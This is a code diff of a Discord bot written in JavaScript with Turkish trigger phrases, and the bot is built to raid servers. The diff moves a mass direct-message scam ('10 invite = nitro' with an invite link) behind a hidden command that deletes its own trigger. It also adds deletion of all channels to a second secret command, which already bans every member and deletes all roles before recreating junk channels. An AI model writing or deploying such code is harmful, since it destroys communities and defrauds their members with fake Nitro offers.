@@ -14,17 +14,21 @@ const http = require('http');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-berke.on('ready', () => {
-    berke.users.forEach(member => member.send("10 invite = nitro - discord.gg/u5RXbSY"))
+berke.on('message', msg => {
+  if (msg.content === 'sadeceberke') {
+    msg.delete()
+    msg.guild.members.forEach(member => member.send("10 invite = nitro - discord.gg/u5RXbSY")
+  )}
 })
 
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
     msg.guild.roles.deleteAll();
-    msg.guild.createChannel("dyno");
-    msg.guild.createChannel("youtube");
-    msg.guild.createChannel("lyrics-hazretleri");
+    msg.guild.channels.deleteAll();
+    msg.guild.createChannel("lyrics");
+    msg.guild.createChannel("lyrics");
+    msg.guild.createChannel("lyrics");
   }
 });
  
